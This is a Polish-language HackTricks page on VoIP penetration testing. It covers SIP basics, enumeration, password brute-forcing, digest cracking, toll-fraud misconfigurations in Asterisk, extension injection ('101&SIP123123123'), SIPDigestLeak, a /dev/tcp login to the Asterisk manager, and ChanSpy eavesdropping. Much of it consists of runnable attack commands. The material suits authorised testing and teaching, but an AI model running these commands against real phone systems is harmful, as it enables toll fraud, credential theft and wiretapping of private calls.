# Testowanie penetracyjne VoIP

<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy swoj **firm reklamowan w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Kup [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**Grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

## Podstawowe informacje o VoIP

Aby zacz nauk na temat dziaania VoIP, sprawd藕:

{% content-ref url="basic-voip-protocols/" %}
[basic-voip-protocols](basic-voip-protocols/)
{% endcontent-ref %}
```
Request name	Description								RFC references
------------------------------------------------------------------------------------------------------
REGISTER	Register a SIP user.							RFC 3261
INVITE		Initiate a dialog for establishing a call. 				RFC 3261
ACK		Confirm that an entity has received.					RFC 3261
BYE		Signal termination of a dialog and end a call.				RFC 3261
CANCEL		Cancel any pending request.						RFC 3261
UPDATE		Modify the state of a session without changing the state of the dialog.	RFC 3311
REFER		Ask recipient to issue a request for the purpose of call transfer.	RFC 3515
PRACK		Provisional acknowledgement.						RFC 3262
SUBSCRIBE	Initiates a subscription for notification of events from a notifier.	RFC 6665
NOTIFY		Inform a subscriber of notifications of a new event.			RFC 6665
PUBLISH		Publish an event to a notification server.				RFC 3903
MESSAGE		Deliver a text message.	Used in instant messaging applications.		RFC 3428
INFO		Send mid-session information that does not modify the session state.	RFC 6086
OPTIONS		Query the capabilities of an endpoint					RFC 3261
```
## Kody odpowiedzi

**1xxOdpowiedzi wstpne**
```
100 Trying
180 Ringing
181 Call is Being Forwarded
182 Queued
183 Session Progress
199 Early Dialog Terminated
```
**2xxPomylne odpowiedzi**
```
200 OK
202 Accepted
204 No Notification
```
**3xxOdpowiedzi przekierowania**
```
300 Multiple Choices
301 Moved Permanently
302 Moved Temporarily
305 Use Proxy
380 Alternative Service
```
**4xxOdpowiedzi o bdach klienta**
```
400 Bad Request
401 Unauthorized
402 Payment Required
403 Forbidden
404 Not Found
405 Method Not Allowed
406 Not Acceptable
407 Proxy Authentication Required
408 Request Timeout
409 Conflict
410 Gone
411 Length Required
412 Conditional Request Failed
413 Request Entity Too Large
414 Request-URI Too Long
415 Unsupported Media Type
416 Unsupported URI Scheme
417 Unknown Resource-Priority
420 Bad Extension
421 Extension Required
422 Session Interval Too Small
423 Interval Too Brief
424 Bad Location Information
425 Bad Alert Message
428 Use Identity Header
429 Provide Referrer Identity
430 Flow Failed
433 Anonymity Disallowed
436 Bad Identity-Info
437 Unsupported Certificate
438 Invalid Identity Header
439 First Hop Lacks Outbound Support
440 Max-Breadth Exceeded
469 Bad Info Package
470 Consent Needed
480 Temporarily Unavailable
481 Call/Transaction Does Not Exist
482 Loop Detected
483 Too Many Hops
484 Address Incomplete
485 Ambiguous
486 Busy Here
487 Request Terminated
488 Not Acceptable Here
489 Bad Event
491 Request Pending
493 Undecipherable
494 Security Agreement Required
```
**5xxOdpowiedzi o bdach serwera**
```
500 Internal Server Error
501 Not Implemented
502 Bad Gateway
503 Service Unavailable
504 Server Time-out
505 Version Not Supported
513 Message Too Large
555 Push Notification Service Not Supported
580 Precondition Failure
```
**6xxOdpowiedzi o globalnej awarii**
```
600 Busy Everywhere
603 Decline
604 Does Not Exist Anywhere
606 Not Acceptable
607 Unwanted
608 Rejected
```
## Wyliczenie VoIP

### Numery telefon贸w

Jednym z pierwszych krok贸w, kt贸re zesp贸 Red Team mo偶e podj, jest wyszukanie dostpnych numer贸w telefon贸w do kontaktu z firm przy u偶yciu narzdzi OSINT, wyszukiwarek Google lub przeszukiwania stron internetowych.

Gdy ju偶 bdziesz mie numery telefon贸w, mo偶esz skorzysta z usug online, aby zidentyfikowa operatora:

* [https://www.numberingplans.com/?page=analysis\&sub=phonenr](https://www.numberingplans.com/?page=analysis\&sub=phonenr)
* [https://mobilenumbertracker.com/](https://mobilenumbertracker.com/)
* [https://www.whitepages.com/](https://www.whitepages.com/)
* [https://www.twilio.com/lookup](https://www.twilio.com/lookup)

Znajc, czy operator wiadczy usugi VoIP, mo偶na zidentyfikowa, czy firma korzysta z VoIP... Ponadto mo偶liwe jest, 偶e firma nie zatrudnia usug VoIP, ale u偶ywa kart PSTN do podczenia swojej wasnej centrali VoIP do tradycyjnej sieci telefonicznej.

Rzeczy takie jak zautomatyzowane odpowiedzi lub muzyka zazwyczaj wskazuj, 偶e jest u偶ywany VoIP.

### Google Dorks
```bash
# Grandstream phones
intitle:"Grandstream Device Configuration" Password
intitle:"Grandstream Device Configuration" (intext:password & intext:"Grandstream Device Configuration" & intext:"Grandstream Networks" | inurl:cgi-bin) -.com|org

# Cisco Callmanager
inurl:"ccmuser/logon.asp"
intitle:"Cisco CallManager User Options Log On" "Please enter your User ID and Password in the spaces provided below and click the Log On button"

# Cisco phones
inurl:"NetworkConfiguration" cisco

# Linksys phones
intitle:"Sipura SPA Configuration"

# Snom phones
intitle:"snom" intext:"Welcome to Your Phone!" inurl:line_login.htm

# Polycom SoundPoint IP & phones
intitle:"SoundPoint IP Configuration Utility - Registration"
"Welcome to Polycom Web Configuration Utility" "Login as" "Password"
intext: "Welcome to Polycom Web Configuration Utility" intitle:"Polycom - Configuration Utility" inurl:"coreConf.htm"
intitle:"Polycom Login" inurl:"/login.html"
intitle:"Polycom Login" -.com

# Elastix
intitle:"Elastix - Login page" intext:"Elastix is licensed under GPL"

# FreePBX
inurl:"maint/index.php?FreePBX" intitle: "FreePBX" intext:"FreePBX Admministration"
```
### Informacje OSINT

Ka偶da inna enumeracja OSINT, kt贸ra pomaga zidentyfikowa u偶ywane oprogramowanie VoIP, bdzie pomocna dla Czerwonego Zespou.

### Enumeracja sieci

* **`nmap`** jest zdolny do skanowania usug UDP, ale ze wzgldu na liczb skanowanych usug UDP, jest bardzo wolny i mo偶e nie by zbyt dokadny w przypadku tego rodzaju usug.
```bash
sudo nmap --script=sip-methods -sU -p 5060 10.10.0.0/24
```
* **`svmap`** z SIPVicious (`sudo apt install sipvicious`): Zlokalizuje usugi SIP w wskazanej sieci.
* `svmap` jest **atwy do zablokowania**, poniewa偶 u偶ywa User-Agent `friendly-scanner`, ale mo偶na zmodyfikowa kod z `/usr/share/sipvicious/sipvicious` i go zmieni.
```bash
# Use --fp to fingerprint the services
svmap 10.10.0.0/24 -p 5060-5070 [--fp]
```
* **`SIPPTS scan`** z [**sippts**](https://github.com/Pepelux/sippts)**:** Skan SIPPTS to bardzo szybki skaner usug SIP przez UDP, TCP lub TLS. Wykorzystuje wielowtkowo i mo偶e skanowa du偶e zakresy sieci. Umo偶liwia atwe okrelenie zakresu port贸w, skanowanie zar贸wno TCP, jak i UDP, u偶ycie innej metody (domylnie u偶ywa OPTIONS) oraz okrelenie innego User-Agent (i nie tylko).
```bash
sippts scan -i 10.10.0.0/24 -p all -r 5060-5080 -th 200 -ua Cisco [-m REGISTER]

[!] IP/Network: 10.10.0.0/24
[!] Port range: 5060-5080
[!] Protocol: UDP, TCP, TLS
[!] Method to scan: REGISTER
[!] Customized User-Agent: Cisco
[!] Used threads: 200
```
* **metasploit**:
```
auxiliary/scanner/sip/options_tcp normal  No     SIP Endpoint Scanner (TCP)
auxiliary/scanner/sip/options     normal  No     SIP Endpoint Scanner (UDP)
```
#### Dodatkowe wyliczanie sieci

Centrala telefoniczna mo偶e r贸wnie偶 ujawnia inne usugi sieciowe, takie jak:

- **69/UDP (TFTP)**: Aktualizacje oprogramowania
- **80 (HTTP) / 443 (HTTPS)**: Zarzdzanie urzdzeniem za pomoc przegldarki internetowej
- **389 (LDAP)**: Alternatywa przechowywania informacji o u偶ytkownikach
- **3306 (MySQL)**: Baza danych MySQL
- **5038 (Manager)**: Umo偶liwia korzystanie z Asterisk z innych platform
- **5222 (XMPP)**: Wiadomoci za pomoc Jabbera
- **5432 (PostgreSQL)**: Baza danych PostgreSQL
- I inne...

### Wyliczanie metod

Mo偶liwe jest znalezienie **dostpnych metod** do u偶ycia w centrali telefonicznej za pomoc `SIPPTS enumerate` z [**sippts**](https://github.com/Pepelux/sippts)
```bash
sippts enumerate -i 10.10.0.10
```
### Analiza odpowiedzi serwera

Bardzo wa偶ne jest analizowanie nag贸wk贸w, kt贸re serwer wysya do nas, w zale偶noci od rodzaju wiadomoci i nag贸wk贸w, kt贸re wysyamy. Dziki `SIPPTS send` z [**sippts**](https://github.com/Pepelux/sippts) mo偶emy wysya spersonalizowane wiadomoci, manipulujc wszystkimi nag贸wkami, i analizowa odpowied藕.
```bash
sippts send -i 10.10.0.10 -m INVITE -ua Grandstream -fu 200 -fn Bob -fd 11.0.0.1 -tu 201 -fn Alice -td 11.0.0.2 -header "Allow-Events: presence" -sdp
```
To r贸wnie偶 jest mo偶liwe w przypadku serwera korzystajcego z websockets. Za pomoc `SIPPTS wssend` z [**sippts**](https://github.com/Pepelux/sippts) mo偶emy wysya spersonalizowane wiadomoci WS.
```bash
sippts wssend -i 10.10.0.10 -r 443 -path /ws
```
### Wymienianie rozszerze

Rozszerzenia w systemie PBX (Private Branch Exchange) odnosz si do **unikalnych wewntrznych identyfikator贸w przypisanych do poszczeg贸lnych** linii telefonicznych, urzdze lub u偶ytkownik贸w w ramach organizacji lub firmy. Rozszerzenia umo偶liwiaj **efektywne przekierowywanie pocze wewntrz organizacji**, bez koniecznoci posiadania indywidualnych zewntrznych numer贸w telefon贸w dla ka偶dego u偶ytkownika lub urzdzenia.

* **`svwar`** z SIPVicious (`sudo apt install sipvicious`): `svwar` to bezpatne narzdzie do skanowania linii rozszerze w systemie SIP PBX. W koncepcji dziaa podobnie do tradycyjnych wardialer贸w, **pr贸bujc odgadn zakres rozszerze lub podan list rozszerze**.
```bash
svwar 10.10.0.10 -p5060 -e100-300 -m REGISTER
```
* **`SIPPTS exten`** z [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS exten identyfikuje rozszerzenia na serwerze SIP. Sipexten mo偶e sprawdza du偶e zakresy sieci i port贸w.
```bash
sippts exten -i 10.10.0.10 -r 5060 -e 100-200
```
* **metasploit**: Mo偶esz r贸wnie偶 wylicza rozszerzenia/nazwy u偶ytkownik贸w za pomoc metasploita:
```
auxiliary/scanner/sip/enumerator_tcp  normal  No     SIP Username Enumerator (TCP)
auxiliary/scanner/sip/enumerator      normal  No     SIP Username Enumerator (UDP)
```
* **`enumiax` (`apt install enumiax`): enumIAX** to narzdzie do **przemuszania nazw u偶ytkownik贸w** protokou Inter Asterisk Exchange. enumIAX mo偶e dziaa w dw贸ch r贸偶nych trybach; Sekwencyjne Pr贸by Odgadnicia Nazwy U偶ytkownika lub Atak Sownikowy.
```bash
enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 10.10.0.10 # Use dictionary
enumiax -v -m3 -M3 10.10.0.10
```
## Ataki VoIP

### Bruteforce hasa - online

Odkrywszy **PBX** oraz niekt贸re **rozszerzenia/nazwy u偶ytkownik贸w**, Czerwony Zesp贸 mo偶e spr贸bowa **uwierzytelnienia za pomoc metody `REGISTER`** do rozszerzenia, u偶ywajc sownika powszechnych hase do brutalnego amania uwierzytelnienia.

{% hint style="danger" %}
Zauwa偶, 偶e **nazwa u偶ytkownika** mo偶e by taka sama jak rozszerzenie, ale ta praktyka mo偶e si r贸偶ni w zale偶noci od systemu PBX, jego konfiguracji i preferencji organizacji...

Jeli nazwa u偶ytkownika nie jest taka sama jak rozszerzenie, bdziesz musia **odgadn nazw u偶ytkownika, aby j brutalnie zama**.
{% endhint %}

* **`svcrack`** z SIPVicious (`sudo apt install sipvicious`): SVCrack pozwala na zamanie hasa dla okrelonej nazwy u偶ytkownika/rozszerzenia na PBX.
```bash
svcrack -u100 -d dictionary.txt udp://10.0.0.1:5080 #Crack known username
svcrack -u100 -r1-9999 -z4 10.0.0.1 #Check username in extensions
```
* **`SIPPTS rcrack`** z [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rcrack to zdalny amacz hase do usug SIP. Rcrack mo偶e testowa hasa dla kilku u偶ytkownik贸w w r贸偶nych adresach IP i zakresach port贸w.
```bash
sippts rcrack -i 10.10.0.10 -e 100,101,103-105 -w wordlist/rockyou.txt
```
* **Metasploit**:
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb)
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb)

### Podsuchiwanie VoIP

Jeli znajdziesz sprzt VoIP w **otwartej sieci Wifi**, mo偶esz **przechwyci ca informacj**. Ponadto, jeli jeste w bardziej zamknitej sieci (podczony za pomoc Ethernetu lub chronionej sieci Wifi), mo偶esz przeprowadzi ataki **MitM, takie jak** [**ARPspoofing**](../../generic-methodologies-and-resources/pentesting-network/#arp-spoofing) midzy **PBX a bram** w celu podsuchania informacji.

Wr贸d informacji sieciowych mo偶esz znale藕 **dane uwierzytelniajce do zarzdzania sprztem**, **rozszerzenia u偶ytkownika**, **nazw u偶ytkownika**, **adresy IP**, nawet **zaszyfrowane hasa** i **pakiety RTP**, kt贸re mo偶na odtworzy, aby **sucha rozmowy**, i wiele wicej.

Aby uzyska te informacje, mo偶esz u偶y narzdzi takich jak Wireshark, tcpdump... ale **specjalnie stworzone narzdzie do podsuchiwania rozm贸w VoIP to** [**ucsniff**](https://github.com/Seabreg/ucsniff).

{% hint style="danger" %}
Zauwa偶, 偶e jeli **TLS jest u偶ywane w komunikacji SIP**, nie bdziesz w stanie zobaczy komunikacji SIP w czytelnej formie.\
To samo bdzie miao miejsce, jeli u偶ywane s **SRTP** i **ZRTP**, **pakiety RTP nie bd w formie tekstu jawnego**.
{% endhint %}

#### Dane uwierzytelniajce SIP (Atak Brute-Force na haso - offline)

[Sprawd藕 ten przykad, aby lepiej zrozumie **komunikacj SIP REGISTER**](basic-voip-protocols/sip-session-initiation-protocol.md#sip-register-example) i dowiedz si, jak s przesyane **dane uwierzytelniajce**.

* **`sipdump`** & **`sipcrack`,** cz **sipcrack** (`apt-get install sipcrack`): Te narzdzia mog **wydoby** z **pcap** **uwierzytelnienia z sum kontroln** w ramach protokou SIP i **przeprowadzi atak bruteforce** na nie.
```bash
sipdump -p net-capture.pcap sip-creds.txt
sipcrack sip-creds.txt -w dict.txt
```
* **`SIPPTS dump`** z [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS dump mo偶e wydoby uwierzytelnienia digest z pliku pcap.
```bash
sippts dump -f capture.pcap -o data.txt
```
* **`SIPPTS dcrack`** z [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS dcrack to narzdzie do amania uwierzytelnienia digest uzyskanego z zrzutu SIPPTS.
```bash
sippts dcrack -f data.txt -w wordlist/rockyou.txt
```
* **`SIPPTS tshark`** z [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS tshark wyodrbnia dane protokou SIP z pliku PCAP.
```bash
sippts tshark -f capture.pcap [-filter auth]
```
#### Kody DTMF

**Nie tylko dane uwierzytelniajce SIP** mog by znalezione w ruchu sieciowym, mo偶liwe jest tak偶e znalezienie kod贸w DTMF, kt贸re s u偶ywane na przykad do dostpu do **poczty gosowej**.\
Mo偶liwe jest wysanie tych kod贸w w wiadomociach **INFO SIP**, w formie **audio** lub wewntrz pakiet贸w **RTP**. Jeli kody znajduj si w pakietach RTP, mo偶na odci t cz rozmowy i skorzysta z narzdzia multimo do ich wyodrbnienia:
```bash
multimon -a DTMF -t wac pin.wav
```
### Darmowe poczenia / Bdy konfiguracji pocze Asterisk

W Asterisku mo偶na zezwoli na poczenie **z okrelonego adresu IP** lub z **dowolnego adresu IP**:
```
host=10.10.10.10
host=dynamic
```
Jeli zostanie okrelony adres IP, host **nie bdzie musia wysya 偶da REJESTRACJI** co jaki czas (w pakiecie REJESTRACJI jest wysyany czas 偶ycia, zwykle 30 minut, co oznacza, 偶e w innym scenariuszu telefon bdzie musia si REJESTROWA co 30 minut). Jednak偶e konieczne bdzie posiadanie otwartych port贸w umo偶liwiajcych poczenia z serwera VoIP w celu odbierania pocze.

Aby zdefiniowa u偶ytkownik贸w, mog by okreleni jako:

* **`type=user`**: U偶ytkownik mo偶e jedynie odbiera poczenia jako u偶ytkownik.
* **`type=friend`**: Mo偶liwe jest wykonanie pocze jako peer i odbieranie ich jako u偶ytkownik (u偶ywane z rozszerzeniami).
* **`type=peer`**: Mo偶liwe jest wysyanie i odbieranie pocze jako peer (SIP-trunks).

Mo偶liwe jest r贸wnie偶 ustanowienie zaufania za pomoc zmiennej insecure:

* **`insecure=port`**: Umo偶liwia poczenia peer zweryfikowane przez IP.
* **`insecure=invite`**: Nie wymaga uwierzytelniania dla wiadomoci INVITE.
* **`insecure=port,invite`**: Oba.

{% hint style="warning" %}
Gdy u偶ywane jest **`type=friend`**, **warto** zmiennej **host** **nie bdzie u偶ywana**, wic jeli administrator **bdnie skonfiguruje SIP-trunk** u偶ywajc tej wartoci, **ka偶dy bdzie m贸g si do niego podczy**.

Na przykad, taka konfiguracja byaby podatna na atak:\
`host=10.10.10.10`\
`insecure=port,invite`\
`type=friend`
{% endhint %}

### Darmowe Poczenia / Bdy Konfiguracji Kontekst贸w Asterisk

W Asterisku **kontekst** to nazwany kontener lub sekcja w planie numeracji, kt贸ry **grupuje powizane rozszerzenia, akcje i reguy**. Plan numeracji jest g贸wnym komponentem systemu Asterisk, poniewa偶 definiuje **spos贸b obsugi i kierowania poczeniami przychodzcymi i wychodzcymi**. Konteksty s u偶ywane do organizacji planu numeracji, zarzdzania kontrol dostpu i zapewnienia separacji midzy r贸偶nymi czciami systemu.

Ka偶dy kontekst jest okrelony w pliku konfiguracyjnym, zazwyczaj w pliku **`extensions.conf`**. Konteksty s oznaczone przez nawiasy kwadratowe, a nazwa kontekstu jest zamknita w nich. Na przykad:
```bash
csharpCopy code[my_context]
```
W kontekcie definiujesz rozszerzenia (wzorce numer贸w wybieranych) i czysz je z seri dziaa lub aplikacji. Te dziaania okrelaj, w jaki spos贸b jest przetwarzane poczenie. Na przykad:
```scss
[my_context]
exten => 100,1,Answer()
exten => 100,n,Playback(welcome)
exten => 100,n,Hangup()
```
To przykad prostego kontekstu o nazwie "my\_context" z rozszerzeniem "100". Gdy kto wybierze 100, poczenie zostanie odebrane, odtworzona zostanie wiadomo powitalna, a nastpnie poczenie zostanie zakoczone.

To jest **inny kontekst**, kt贸ry pozwala na **wybieranie innych numer贸w**:
```scss
[external]
exten => _X.,1,Dial(SIP/trunk/${EXTEN})
```
Jeli administrator definiuje **domylny kontekst** jako:
```
[default]
include => my_context
include => external
```
{% hint style="warning" %}
Ka偶dy bdzie m贸g u偶y **serwera do dzwonienia pod dowolny numer** (a administrator serwera zapaci za poczenie).
{% endhint %}

{% hint style="danger" %}
Co wicej, domylnie plik **`sip.conf`** zawiera **`allowguest=true`**, wic **ka偶dy** atakujcy **bez uwierzytelnienia** bdzie m贸g dzwoni pod dowolny numer.
{% endhint %}

*   **`SIPPTS invite`** z [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS invite sprawdza, czy **serwer PBX pozwala nam na wykonywanie pocze bez uwierzytelnienia**. Jeli serwer SIP ma niepoprawn konfiguracj, pozwoli nam na dzwonienie pod zewntrzne numery. Mo偶e r贸wnie偶 umo偶liwi przekierowanie poczenia na drugi zewntrzny numer.

Na przykad, jeli tw贸j serwer Asterisk ma z konfiguracj kontekstu, mo偶esz akceptowa 偶dania INVITE bez autoryzacji. W takim przypadku atakujcy mo偶e dzwoni, nie znajc 偶adnego u偶ytkownika/hasa.

{% code overflow="wrap" %}
```bash
# Trying to make a call to the number 555555555 (without auth) with source number 200.
sippts invite -i  10.10.0.10 -fu 200 -tu 555555555 -v

# Trying to make a call to the number 555555555 (without auth) and transfer it to number 444444444.
sippts invite -i 10.10.0.10 -tu 555555555 -t 444444444
```
{% endcode %}

### Darmowe poczenia / 殴le skonfigurowane IVRS

IVRS oznacza **Interaktywny System Rozpoznawania Gosu**, technologi telefoniczn, kt贸ra umo偶liwia u偶ytkownikom interakcj z zautomatyzowanym systemem za pomoc gosu lub klawiszy DTMF. IVRS su偶y do budowania system贸w **automatyzacji obsugi pocze**, kt贸re oferuj szereg funkcji, takich jak udostpnianie informacji, kierowanie pocze i przechwytywanie danych od u偶ytkownik贸w.

IVRS w systemach VoIP zazwyczaj skada si z:

1. **Komunikat贸w gosowych**: Wstpnie nagrane komunikaty audio, kt贸re prowadz u偶ytkownik贸w przez opcje menu IVR i instrukcje.
2. **Sygnalizacji DTMF** (Dual-Tone Multi-Frequency): Sygnay generowane przez nacinicie klawiszy na telefonie, kt贸re su偶 do nawigacji po menu IVR i wprowadzania danych.
3. **Kierowania pocze**: Kierowanie pocze do odpowiedniego celu, takich jak konkretne dziay, agenci lub numery wewntrzne na podstawie danych wprowadzonych przez u偶ytkownika.
4. **Przechwytywania danych od u偶ytkownika**: Zbieranie informacji od dzwonicych, takich jak numery kont, identyfikatory przypadk贸w lub inne istotne dane.
5. **Integracji z systemami zewntrznymi**: czenie systemu IVR z bazami danych lub innymi systemami oprogramowania w celu uzyskiwania lub aktualizowania informacji, wykonywania dziaa lub wyzwalania zdarze.

W systemie VoIP Asterisk mo偶na utworzy IVR za pomoc planu numeracji (**plik **`extensions.conf`**) i r贸偶nych aplikacji, takich jak `Background()`, `Playback()`, `Read()` i inne. Te aplikacje pomagaj odtwarza komunikaty gosowe, przechwytywa dane od u偶ytkownik贸w i kontrolowa przepyw poczenia.

#### Przykad podatnej konfiguracji
```scss
exten => 0,100,Read(numbers,the_call,,,,5)
exten => 0,101,GotoIf("$[${numbers}"="1"]?200)
exten => 0,102,GotoIf("$[${numbers}"="2"]?300)
exten => 0,103,GotoIf("$[${numbers}"=""]?100)
exten => 0,104,Dial(LOCAL/${numbers})
```
Poprzednie jest przykadem, w kt贸rym u偶ytkownik jest proszony o **nacinicie 1, aby zadzwoni** do dziau, **2, aby zadzwoni** gdzie indziej, lub **peny numer wewntrzny**, jeli go zna.

Podatno polega na tym, 偶e wskazana **dugo numeru wewntrznego nie jest sprawdzana, wic u偶ytkownik mo偶e wprowadzi peny numer w czasie 5 sekund i zostanie on wybrany.**

### Wstrzykiwanie numeru wewntrznego

Korzystajc z numeru wewntrznego, na przykad:
```scss
exten => _X.,1,Dial(SIP/${EXTEN})
```
Gdzie **`${EXTEN}`** to **numer wewntrzny**, kt贸ry zostanie wybrany, gdy zostanie wprowadzony **ext 101**, to co by si stao:
```scss
exten => 101,1,Dial(SIP/101)
```
Jednak jeli **`${EXTEN}`** pozwala na wprowadzanie **wicej ni偶 liczb** (jak w starszych wersjach Asteriska), atakujcy m贸gby wprowadzi **`101&SIP123123123`** aby zadzwoni pod numer telefonu 123123123. I to byby rezultat:
```scss
exten => 101&SIP123123123,1,Dial(SIP/101&SIP123123123)
```
Dlatego te偶 poczenie z rozszerzeniem **`101`** i **`123123123`** zostanie wysane i tylko pierwsze poczenie zostanie nawizane... ale jeli atakujcy u偶yje **rozszerzenia, kt贸re omija dopasowanie** wykonywane, ale nie istnieje, mo偶e **wstrzykn poczenie tylko do po偶danego numeru**.

## Wra偶liwo SIPDigestLeak

Wyciek SIP Digest to podatno, kt贸ra dotyka du偶 liczb telefon贸w SIP, w tym zar贸wno sprztowe i oprogramowanie telefoniczne IP, jak i adaptery telefoniczne (VoIP do analogowego). Podatno ta pozwala na **wyciek odpowiedzi uwierzytelniania Digest**, kt贸ra jest obliczana na podstawie hasa. Nastpnie mo偶liwy jest **atak offline na haso** i odzyskanie wikszoci hase na podstawie odpowiedzi na wyzwanie.

**[Scenariusz podatnoci od tego miejsca**](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf):

1. Telefon IP (ofiara) nasuchuje na dowolnym porcie (na przykad: 5060), akceptujc poczenia telefoniczne
2. Atakujcy wysya INVITE do telefonu IP
3. Telefon ofiary zaczyna dzwoni i kto odbiera i odkada suchawk (poniewa偶 nikt nie odbiera telefonu po drugiej stronie)
4. Gdy telefon jest odo偶ony, **telefon ofiary wysya BYE do atakujcego**
5. **Atakujcy wysya odpowied藕 407**, kt贸ra **prosi o uwierzytelnienie** i wysya wyzwanie uwierzytelniania
6. **Telefon ofiary udziela odpowiedzi na wyzwanie uwierzytelniania** w drugim BYE
7. **Atakujcy mo偶e wtedy przeprowadzi atak brute-force** na odpowied藕 na wyzwanie na swoim lokalnym komputerze (lub rozproszon sie itp.) i zgadn haso

* **Wyciek SIPPTS** z [**sippts**](https://github.com/Pepelux/sippts)**:** Wyciek SIPPTS wykorzystuje podatno wycieku SIP Digest, kt贸ra dotyka du偶 liczb telefon贸w SIP. Wynik mo偶na zapisa w formacie SipCrack, aby przeprowadzi atak brute-force za pomoc narzdzia SIPPTS dcrack lub narzdzia SipCrack.
```bash
sippts leak -i 10.10.0.10

[!] Target: 10.10.0.10:5060/UDP
[!] Caller: 100
[!] Callee: 100

[=>] Request INVITE
[<=] Response 100 Trying
[<=] Response 180 Ringing
[<=] Response 200 OK
[=>] Request ACK
... waiting for BYE ...
[<=] Received BYE
[=>] Request 407 Proxy Authentication Required
[<=] Received BYE with digest
[=>] Request 200 Ok

Auth=Digest username="pepelux", realm="asterisk", nonce="lcwnqoz0", uri="sip:100@10.10.0.10:56583;transport=UDP", response="31fece0d4ff6fd524c1d4c9482e99bb2", algorithm=MD5
```
### Click2Call

Click2Call pozwala **u偶ytkownikowi sieci web** (kt贸ry na przykad mo偶e by zainteresowany produktem) **wprowadzi** sw贸j **numer telefonu**, aby zosta zadzwonionym. Nastpnie zostanie wykonane poczenie komercyjne, a gdy **odejmie suchawk**, u偶ytkownik zostanie **zadzwoniony i poczony z agentem**.

Powszechny profil Asterisk dla tego to:
```scss
[web_user]
secret = complex_password
deny = 0.0.0.0/0.0.0.0
allow = 0.0.0.0/0.0.0.0
displayconnects = yes
read = system,call,log,verbose,agent,user,config,dtmf,reporting,crd,diapla
write = system,call,agent,user,config,command,reporting,originate
```
* Poprzedni profil pozwala **KA呕DEMU adresowi IP na poczenie** (jeli znane jest haso).
* Aby **zorganizowa poczenie**, jak wczeniej okrelono, **nie jest konieczne posiadanie uprawnie do odczytu**, a jedynie **uprawnienia do inicjowania** w trybie **zapisu**.

Z tymi uprawnieniami ka偶de IP znajce haso mogoby si poczy i wydoby zbyt wiele informacji, takich jak:

{% code overflow="wrap" %}
```bash
# Get all the peers
exec 3<>/dev/tcp/10.10.10.10/5038 && echo -e "Action: Login\nUsername:test\nSecret:password\nEvents: off\n\nAction:Command\nCommand: sip show peers\n\nAction: logoff\n\n">&3 && cat <&3
```
{% endcode %}

**Wicej informacji lub dziaa mo偶e by wymagane.**

### **Podsluchiwanie**

W Asterisku mo偶liwe jest u偶ycie polecenia **`ChanSpy`** wskazujcego **rozszerzenie(-a) do monitorowania** (lub wszystkie) w celu podsuchiwania rozm贸w. To polecenie musi by przypisane do rozszerzenia.

Na przykad, **`exten => 333,1,ChanSpy('all',qb)`** oznacza, 偶e jeli **zadzwonisz** na **rozszerzenie 333**, bdzie **monitorowa** **`wszystkie`** rozszerzenia, **rozpocznie nasuchiwanie** gdy zacznie si nowa rozmowa (**`b`**) w trybie cichym (**`q`**), poniewa偶 nie chcemy na ni wpywa. Mo偶esz przej z jednej rozmowy do drugiej, naciskajc **`*`**, lub oznaczajc numer rozszerzenia.

Mo偶liwe jest r贸wnie偶 u偶ycie **`ExtenSpy`** do monitorowania tylko jednego rozszerzenia.

Zamiast suchania rozm贸w, mo偶na je **nagrywa w plikach** przy u偶yciu rozszerzenia, na przykad:
```scss
[recorded-context]
exten => _X.,1,Set(NAME=/tmp/${CONTEXT}_${EXTEN}_${CALLERID(num)}_${UNIQUEID}.wav)
exten => _X.,2,MixMonitor(${NAME})
```
{% endcode %}

Poczenia zostan zapisane w **`/tmp`**.

Mo偶esz nawet sprawi, 偶e Asterisk **wykona skrypt, kt贸ry ujawni poczenie**, gdy zostanie zamknity.
```scss
exten => h,1,System(/tmp/leak_conv.sh &)
```
### Wra偶liwo RTCPBleed

**RTCPBleed** to powa偶ny problem zwizany z bezpieczestwem dotykajcy serwer贸w VoIP opartych na Asterisku (opublikowany w 2017 roku). Wra偶liwo ta pozwala na **przechwycenie i przekierowanie ruchu RTP (Real Time Protocol)**, kt贸ry przenosi rozmowy VoIP, przez dowoln osob w Internecie. Zjawisko to wystpuje, poniewa偶 ruch RTP omija uwierzytelnianie podczas przechodzenia przez zapory NAT (Network Address Translation).

